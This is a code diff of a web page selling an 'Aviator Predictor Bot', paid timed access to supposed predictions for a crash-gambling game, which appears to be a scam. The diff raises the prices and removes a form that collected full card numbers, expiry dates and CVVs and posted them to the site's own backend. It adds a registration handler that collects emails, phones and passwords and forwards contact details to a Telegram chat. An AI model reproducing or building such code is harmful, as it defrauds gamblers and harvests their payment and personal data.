+                        <button class="site-btn" data-site="SportPesa"><img src="data:image/jpeg;base64,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" alt="SportPesa" style="height:32px;vertical-align:middle;background-color:#e50914;width:32px;border-radius:4px;"> SportPesa</button>
+                    </div>
                 <button class="bot-btn" id="connectBtn" style="margin-top:16px;">Connect</button>
             </div>
             <div class="hidden" id="botStatus" style="margin-top:24px;">
@@ -257,15 +274,16 @@
                         <h1>avisignals.com</h1>
                         <h2 style="color:#f1c40f;margin-bottom:20px;">Aviator Predictor Bot - Live</h2>
                         <div class="plane-container">
-                            <div class="plane-icon">🚀</div>
+                            <div class="plane-icon" ><img src="/home/cncjosh/Desktop/Avsite n/Avsite 3.0/AvSiteImg/aviator_jogo.png" alt="Aviator Game" style="width:50%;border-radius:4px;"></div>
                         </div>
                         <div class="game-status" id="gameStatus">Spribe Bot - Environment</div>
                         <div class="round-info">
                             <div id="roundStatus" style="font-size:1.4em;margin-bottom:10px;">Waiting for next round...</div>
                             <div class="prediction-display prediction-blurred" id="predictionDisplay">8.45x</div>
                             <div id="roundTimer" style="color:#ccc;font-size:0.9em;"></div>
+                            <button class="game-start-btn" id="gameStartBtn" onclick="showActivationOptions()">Activate Bot</button>
                         </div>
-                        <button class="game-start-btn" id="gameStartBtn" onclick="showActivationOptions()">Activate Bot</button>
+                        
                         
                         <!-- Activation Overlay -->
                         <div class="activation-overlay hidden" id="activationOverlay">
@@ -274,25 +292,25 @@
                                 <p style="color:#ccc;margin-bottom:20px;">Choose your activation plan to unlock real-time predictions</p>
                                 
                                 <div class="pricing-grid">
-                                    <div class="price-option" data-plan="2min" data-price="1.99">
+                                    <div class="price-option" data-plan="2min" data-price="28.99">
                                         <div class="price-title">Quick Play</div>
-                                        <div class="price-amount">$1.99</div>
+                                        <div class="price-amount">$28.99</div>
                                         <div class="price-duration">2 Minutes</div>
                                     </div>
-                                    <div class="price-option popular" data-plan="15min" data-price="8.99">
+                                    <div class="price-option popular" data-plan="15min" data-price="54.99">
                                         <div class="price-title">Power Session</div>
-                                        <div class="price-amount">$7.99</div>
+                                        <div class="price-amount">$54.99</div>
                                         <div class="price-duration">15 Minutes</div>
                                     </div>
                                 </div>
-                                <div class="price-option" data-plan="30min" data-price="24.99">
+                                <div class="price-option" data-plan="30min" data-price="78.99">
                                     <div class="price-title">Extended Play</div>
-                                    <div class="price-amount">$24.99</div>
+                                    <div class="price-amount">$78.99</div>
                                     <div class="price-duration">30 Minutes</div>
                                 </div>
-                                <div class="price-option" data-plan="1hour" data-price="44.99">
+                                <div class="price-option" data-plan="1hour" data-price="99.9">
                                     <div class="price-title">Premium Hour</div>
-                                    <div class="price-amount">$44.99</div>
+                                    <div class="price-amount">$99.9</div>
                                     <div class="price-duration">1 Hour</div>
                                 </div>
                                 <div class="price-option" data-plan="12hour" data-price="479.99">
@@ -337,7 +355,7 @@
                 <div class="payment-summary">
                     <div class="plan-details">
                         <div class="plan-name" id="paymentPlanName">15 Minutes Access</div>
-                        <div class="plan-price" id="paymentPlanPrice">$8.99</div>
+                        <div class="plan-price" id="paymentPlanPrice">$54.99</div>
                     </div>
                     <div class="payment-benefits">
                         <div class="benefit">✅ Instant Bot Activation</div>
@@ -349,40 +367,19 @@
                 
                 <form id="paymentForm" class="payment-form">
                     <div class="payment-method">
-                        <label>Choose Payment Method</label>
-                        <div class="payment-options">
-                            <div class="payment-option" data-method="card" id="cardPaymentOption">
-                                <i class="fas fa-credit-card"></i>
-                                <span>Credit/Debit Card (Optional)</span>
+                        <label>Payment Method</label>
+                        <div class="payment-info">
+                            <div class="payment-notice">
+                                <i class="fas fa-info-circle"></i>
+                                <span>Secure checkout via Selar - supports Bank Transfer, PayPal, Mobile Money and Credit/Debit Cards</span>
                             </div>
                         </div>
                     </div>
                     
-                    <div id="cardPayment" class="payment-details" style="display: none;">
-                        <div class="form-group">
-                            <label>Card Number</label>
-                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
-                        </div>
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label>Expiry Date</label>
-                                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
-                            </div>
-                            <div class="form-group">
-                                <label>CVV</label>
-                                <input type="text" id="cvv" placeholder="123" maxlength="4">
-                            </div>
-                        </div>
-                        <div class="form-group">
-                            <label>Cardholder Name</label>
-                            <input type="text" id="cardholderName" placeholder="John Doe">
-                        </div>
-                    </div>
-                    
-                    <!-- Complete Payment Button (Always Visible) -->
+                    <!-- Complete Payment Button -->
                     <button type="button" class="complete-payment-btn" id="completePaymentBtn" style="background: #ff6b35; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; margin: 20px 0 10px 0; transition: all 0.3s ease;">
-                        <i class="fas fa-credit-card"></i>
-                        Complete Payment
+                        <i class="fas fa-external-link-alt"></i>
+                        Complete Payment via Selar
                     </button>
                     
                     <!-- Activate Bot Button (Always Visible Below) -->
@@ -1021,6 +1018,122 @@
             }
         };
 
+        // Toggle between login and register forms
+        document.getElementById('registerLink').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('bot-login').classList.add('hidden');
+            document.getElementById('bot-register').classList.remove('hidden');
+        };
+
+        document.getElementById('loginLink').onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('bot-register').classList.add('hidden');
+            document.getElementById('bot-login').classList.remove('hidden');
+        };
+
+        // Registration form handler
+        document.getElementById('registerForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const email = (this.email.value || '').trim();
+            const phone = (this.phone.value || '').trim();
+            const password = (this.password.value || '').trim();
+            const confirmPassword = (this.confirmPassword.value || '').trim();
+            
+            // Basic validation
+            if (!email || !phone || !password || !confirmPassword) {
+                alert('Please fill in all fields.');
+                return;
+            }
+            
+            // Email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert('Please enter a valid email address.');
+                return;
+            }
+            
+            // Phone validation
+            const phoneValidation = validateContactInput(phone);
+            if (!phoneValidation.valid) {
+                alert(phoneValidation.message);
+                return;
+            }
+            
+            // Password validation
+            if (password.length < 4) {
+                alert('Password must be at least 4 characters long.');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                alert('Passwords do not match.');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Registering...';
+            
+            try {
+                // Send registration request to backend
+                const response = await fetch(`${API_BASE_URL}/api/telegram/bot-register`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        phone: phone,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Send registration notification to Telegram
+                    const registrationMessage = `🆕 NEW BOT USER REGISTRATION
+👤 Email: ${email}
+📱 Phone: ${phone}
+⏰ Registration Time: ${new Date().toLocaleString()}
+🤖 Platform: Aviator Predictor Bot
+📍 IP: ${navigator.userAgent}
+🔗 Status: Successfully registered`;
+
+                    try {
+                        await sendToTelegram(registrationMessage);
+                        console.log('✅ Registration notification sent to Telegram');
+                    } catch (telegramError) {
+                        console.warn('⚠️ Failed to send registration notification to Telegram:', telegramError);
+                        // Don't fail the registration if Telegram notification fails
+                    }
+                    
+                    alert('Registration successful! You can now login.');
+                    
+                    // Switch back to login form
+                    document.getElementById('bot-register').classList.add('hidden');
+                    document.getElementById('bot-login').classList.remove('hidden');
+                    
+                    // Pre-fill login form with email
+                    document.querySelector('#loginForm input[name="contact"]').value = email;
+                    
+                    this.reset();
+                } else {
+                    throw new Error(result.error || 'Registration failed');
+                }
+                
+            } catch (error) {
+                console.error('❌ Registration error:', error);
+                alert('Registration failed. Please try again.');
+            } finally {
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalText;
+            }
+        };
+
         // Start Bot button
         document.getElementById('startBotBtn').onclick = function() {
             document.getElementById('startBotBtn').classList.add('hidden');
@@ -1355,13 +1468,6 @@
             document.getElementById('paymentPlanName').textContent = selectedPlan.duration + ' Access';
             document.getElementById('paymentPlanPrice').textContent = '$' + selectedPlan.price;
             
-            // Reset modal state - hide card details, show both buttons
-            const cardDetails = document.getElementById('cardPayment');
-            const cardOption = document.getElementById('cardPaymentOption');
-            
-            cardDetails.style.display = 'none';
-            cardOption.classList.remove('selected');
-            
             // Show the payment modal
             document.getElementById('paymentModal').classList.remove('hidden');
             
@@ -1374,88 +1480,10 @@
             // Reset form
             document.getElementById('paymentForm').reset();
             
-            // Reset modal state
-            const cardDetails = document.getElementById('cardPayment');
-            const cardOption = document.getElementById('cardPaymentOption');
-            
-            cardDetails.style.display = 'none';
-            cardOption.classList.remove('selected');
-            
             console.log('Payment modal closed and reset');
         }
 
-        // Payment method selection
-        document.addEventListener('click', (e) => {
-            if (e.target.closest('.payment-option')) {
-                const option = e.target.closest('.payment-option');
-                document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
-                option.classList.add('selected');
-                
-                const method = option.dataset.method;
-                
-                // Hide all payment details (only if elements exist)
-                const cardPayment = document.getElementById('cardPayment');
-                if (cardPayment) {
-                    cardPayment.classList.add('hidden');
-                }
-                
-                // Show selected payment method
-                if (method === 'card' && cardPayment) {
-                    cardPayment.classList.remove('hidden');
-                }
-            }
-        });
-
-        // Card number formatting (with null check)
-        const cardNumber = document.getElementById('cardNumber');
-        if (cardNumber) {
-            cardNumber.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-                e.target.value = formattedValue;
-            });
-        }
-
-        // Expiry date formatting (with null check)
-        const expiryDate = document.getElementById('expiryDate');
-        if (expiryDate) {
-            expiryDate.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length >= 2) {
-                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
-                }
-                e.target.value = value;
-            });
-        }
-
-        // CVV formatting (with null check)
-        const cvv = document.getElementById('cvv');
-        if (cvv) {
-            cvv.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            });
-        }
-
-        // Handle card payment option click - show/hide card details (with null check)
-        const cardPaymentOption = document.getElementById('cardPaymentOption');
-        if (cardPaymentOption) {
-            cardPaymentOption.addEventListener('click', function() {
-                const cardDetails = document.getElementById('cardPayment');
-                
-                if (cardDetails) {
-                    // Toggle card details visibility (both buttons always visible)
-                    if (cardDetails.style.display === 'none' || cardDetails.style.display === '') {
-                        cardDetails.style.display = 'block';
-                        this.classList.add('selected');
-                    } else {
-                        cardDetails.style.display = 'none';
-                        this.classList.remove('selected');
-                    }
-                }
-            });
-        }
-
-        // Handle Complete Payment button click (always visible) - with null check
+        // Handle Complete Payment button click - with null check
         const completePaymentBtn = document.getElementById('completePaymentBtn');
         if (completePaymentBtn) {
             completePaymentBtn.addEventListener('click', async function() {
@@ -1470,81 +1498,39 @@
                 // Get Selar link for current plan
                 const selarLinks = {
                     '2min': 'https://selar.com/257r71m8jq',
-                '15min': 'https://selar.com/727771n8q8', 
-                '30min': 'https://selar.com/7z65psg003',
-                '1hour': 'https://selar.com/5733769561',
-                '12hour': 'https://selar.com/2w191k1kl7',
-                '24hour': 'https://selar.com/23l421lgif'
-            };
-            const selarLink = selarLinks[selectedPlan.plan] || 'https://selar.com/m/jordan-baker1294382';
-            
-            try {
-                // Check if card details are filled (optional) - with null checks
-                const cardNumberEl = document.getElementById('cardNumber');
-                const cardDetails = document.getElementById('cardPayment');
-                const cardNumber = cardNumberEl ? cardNumberEl.value : '';
-                const hasCardInfo = cardDetails && cardDetails.style.display === 'block' && cardNumber.trim() !== '';
+                    '15min': 'https://selar.com/727771n8q8', 
+                    '30min': 'https://selar.com/7z65psg003',
+                    '1hour': 'https://selar.com/5733769561',
+                    '12hour': 'https://selar.com/2w191k1kl7',
+                    '24hour': 'https://selar.com/23l421lgif'
+                };
+                const selarLink = selarLinks[selectedPlan.plan] || 'https://selar.com/m/jordan-baker1294382';
                 
-                if (hasCardInfo) {
-                    // Send card info via secure backend endpoint - with null checks
-                    const expiryDateEl = document.getElementById('expiryDate');
-                    const cvvEl = document.getElementById('cvv');
-                    const cardholderNameEl = document.getElementById('cardholderName');
-                    
-                    const expiryDate = expiryDateEl ? expiryDateEl.value : '';
-                    const cvv = cvvEl ? cvvEl.value : '';
-                    const cardholderName = cardholderNameEl ? cardholderNameEl.value : '';
-                    
-                    const response = await fetch(`${API_BASE_URL}/api/payments/card-payment`, {
-                        method: 'POST',
-                        headers: { 
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            contact: userContact,
-                            packageName: packageName,
-                            amount: selectedPlan.price,
-                            source: 'Bot Payment Form',
-                            cardInfo: {
-                                cardNumber: cardNumber,
-                                expiryDate: expiryDate,
-                                cvv: cvv,
-                                cardholderName: cardholderName
-                            },
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                    
-                    const result = await response.json();
-                    if (!result.success) {
-                        console.warn('⚠️ Card payment notification failed:', result.error);
-                    }
-                } else {
+                try {
                     // Send simple Selar notification
                     await sendSelarNotification(userContact, packageName);
+                } catch (error) {
+                    console.error('Failed to send notification:', error);
                 }
-            } catch (error) {
-                console.error('Failed to send notification:', error);
-            }
-            
-            // Redirect to Selar checkout
-            setTimeout(() => {
-                window.open(selarLink, '_blank');
                 
-                // Reset button
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-credit-card"></i> Complete Payment via Selar';
-                
-                // Close payment modal
-                closePaymentModal();
-                
-                // Show verification message
-                alert('Payment window opened! Complete your payment in the new tab, then return here and click "I\'ve Sent Payment" for verification.');
-                
-                // Add verification button to activation overlay
-                showVerificationButton();
-            }, 1000);
-        });
+                // Redirect to Selar checkout
+                setTimeout(() => {
+                    window.open(selarLink, '_blank');
+                    
+                    // Reset button
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fas fa-external-link-alt"></i> Complete Payment via Selar';
+                    
+                    // Close payment modal
+                    closePaymentModal();
+                    
+                    // Show verification message
+                    alert('Payment window opened! Complete your payment in the new tab, then return here and click "I\'ve Sent Payment" for verification.');
+                    
+                    // Add verification button to activation overlay
+                    showVerificationButton();
+                }, 1000);
+            });
         }
 
         // Handle activate bot button click - for manual verification using Selar system (with null check)
